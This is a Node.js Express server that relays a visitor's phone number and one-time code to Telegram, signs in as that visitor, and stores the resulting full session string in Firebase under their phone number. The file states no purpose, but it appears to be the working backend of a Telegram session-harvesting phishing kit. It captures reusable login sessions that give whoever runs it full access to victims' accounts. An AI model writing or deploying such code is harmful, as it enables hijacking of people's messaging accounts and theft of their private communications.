require('dotenv').config();
const express = require('express');
const path = require('path');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const admin = require('firebase-admin');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

// ================= FIREBASE =================
admin.initializeApp({
  credential: admin.credential.cert({
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
  }),
  databaseURL: `https://${process.env.FIREBASE_PROJECT_ID}.firebaseio.com`
});

const db = admin.database();

// ================= TELEGRAM =================
const apiId = parseInt(process.env.API_ID);
const apiHash = process.env.API_HASH;

// temp store
const tempSessions = {};

// ================= ROUTES =================

// Serve UI
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});


// 🔹 STEP 1: SEND OTP
app.post('/send-otp', async (req, res) => {
  const { phone } = req.body;

  if (!phone) {
    return res.json({ success: false, error: 'Phone required' });
  }

  try {
    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, apiId, apiHash, {
      connectionRetries: 5,
    });

    await client.connect(); // ✅ correct

    const result = await client.sendCode({
      apiId,
      apiHash,
    }, {
      phoneNumber: phone,
    });

    // save temp
    tempSessions[phone] = {
      client,
      phoneCodeHash: result.phoneCodeHash,
    };

    console.log("OTP sent to:", phone);

    res.json({ success: true });

  } catch (err) {
    console.error("SEND OTP ERROR:", err.message);
    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});


// 🔹 STEP 2: VERIFY OTP
app.post('/login', async (req, res) => {
  const { phone, otp } = req.body;

  if (!phone || !otp) {
    return res.send("Phone & OTP required");
  }

  try {
    const temp = tempSessions[phone];

    if (!temp) {
      return res.send("Session expired. Try again.");
    }

    const { client, phoneCodeHash } = temp;

    await client.signIn({
      phoneNumber: phone,
      phoneCode: otp,
      phoneCodeHash: phoneCodeHash,
    });

    const sessionString = client.session.save();

    // save to Firebase
    await db.ref('telegram_sessions/' + phone).set({
      session: sessionString,
      timestamp: Date.now()
    });

    // cleanup
    delete tempSessions[phone];

    console.log("LOGIN SUCCESS:", phone);

    res.send("<h3>✅ Login successful!</h3>");

  } catch (err) {
    console.error("LOGIN ERROR:", err.message);
    res.send(`<h3>❌ ${err.message}</h3>`);
  }
});


// ================= START =================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
